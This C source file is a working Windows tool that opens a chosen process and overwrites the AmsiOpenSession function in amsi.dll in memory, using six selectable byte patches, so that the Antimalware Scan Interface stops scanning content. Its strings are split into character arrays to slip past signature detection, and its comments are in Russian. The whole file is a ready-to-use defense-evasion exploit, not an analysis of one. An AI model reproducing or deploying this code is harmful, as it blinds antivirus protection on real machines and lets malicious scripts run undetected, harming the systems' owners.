#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")


#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };

// Структура Nt функции для снятия защиты с памяти

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

// Структура Nt функции для записи в память

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);



void AMS1patch1(HANDLE hproc) {
	// Загружаем библиотеку и получачем адресс функции
	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
	INT_PTR ptr_0Val = *(INT_PTR*)((INT_PTR)ptr);


	// Инициализируем буффер очищаем его и присваивает туда H1A
	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, "\x81\x39\x44\x31\x52\x4B\x75\x3a");

	// Вывод буффера патч
	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

	// Снимаем протекцию с памяти по адресу функции
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return ;
	}
	// Записываем по адресу функции буффер
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + 0xa), (PVOID)Patch, 8, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return ;
	}
	// Меняем протецию памяти на изначальное значение
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return ;
	}

	// Вывод то что сделала программма в памяти
	printf("\nAfter Patching :\n ");
	printf("\t81394431524B\t\t		:	cmp     dword ptr [rcx],4B523144h  => AMSI,D1RK\n");
	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");
	
	printf("\n[+] AMSI patched !!\n\n");
}

void AMS1patch2(HANDLE hproc) {
	// Загружаем библиотеку и получачем адресс функции
	
	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
	INT_PTR ptr_0Val = *(INT_PTR*)((INT_PTR)ptr);



	// Инициализируем буффер очищаем его и присваивает туда H1A
	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, "\xC7\x01\x44\x31\x52\x4B\x90\x90");

	// Вывод буффера патч
	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	void* ptraddr = ptr;

	// Снимаем протекцию с памяти по адресу функции
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	// Записываем по адресу функции буффер
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr), (PVOID)Patch, 8, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	// Меняем протецию памяти на изначальное значение
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return;
	}
	// Вывод то что сделала программма в памяти
	printf("\n[+] After Patching :\n");
	printf("\tc7014431524b       mov    DWORD PTR [rcx],0x4b523144 (D1RK)\n");
	printf("\n[+] AMSI context header has been corrupted with \"D1RK\", AMS1 session Not Created !!\n");
	printf("\n[+] AMSI patched !!\n\n");
}


void AMS1patchxor(HANDLE hproc, int number) {

	// Загружаем библиотеку и получачем адресс функции
	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);


	// Инициализируем буффер очищаем его и присваивает туда H1A

	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, "\x48\x31\xC0");

	// Вывод буффера патч
	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	void* ptraddr = (void*)(((INT_PTR)ptr + number));

	// Снимаем протекцию с памяти по адресу функции
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	// Записываем по адресу функции буффер
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + number), (PVOID)Patch, 3, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	// Меняем протецию памяти на изначальное значение
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return;
	}
	// Вывод то что сделала программма в памяти
	printf("\nAfter Patching :\n ");
	printf("\t4831c0\t\t\t\t              :   xor    rax,rax  => ZF = 1\n");
	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");

	printf("\n[+] AMSI patched !!\n\n");
}


void AMS1xornop(HANDLE hproc, int number) {

	// Загружаем библиотеку и получачем адресс функции
	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);


	// Инициализируем буффер очищаем его и присваивает туда H1A
	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, "\x48\x31\xC0\x90\x90");

	// Вывод буффера патч
	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	void* ptraddr = (void*)(((INT_PTR)ptr + number));

	// Снимаем протекцию с памяти по адресу функции
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	// Записываем по адресу функции буффер
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + number), (PVOID)Patch, 5, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	// Меняем протецию памяти на изначальное значение
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return;
	}

	// Вывод результата работы программы
	printf("\nAfter Patching :\n ");
	printf("\t4831c0\t\t\t\t              :   xor    rax,rax  => ZF = 1\n");
	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");

	printf("\n[+] AMSI patched !!\n\n");
}


int main(int argc, char** argv) {

	HANDLE hProc;

	// Проверяем если передаваемых параметров меньше 2, то выводим ошибку
	if (argc < 3) {
		printf("USAGE: AMS1-Patch.exe <PID> <Patch_Nbr, 1 to 6>\n");
		return 1;
	}

	// Получаем хендл процесса с правами на чтение и запись, если хендл не получили то выводим ошику
	hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
	if (!hProc) {
		printf("Failed in OpenProcess (%u)\n", GetLastError());
		return 2;
	}
	

	if (atoi(argv[2]) == 1)
		AMS1patch1(hProc);
	else if (atoi(argv[2]) == 2)
		AMS1patch2(hProc);
	else if (atoi(argv[2]) == 3)
		AMS1patchxor(hProc, 0);
	else if (atoi(argv[2]) == 4)
		AMS1patchxor(hProc, 5);
	else if (atoi(argv[2]) == 5)
		AMS1xornop(hProc, (int)0x12);
	else
		AMS1xornop(hProc, (int)0x19);
	
	return 0;
	
}
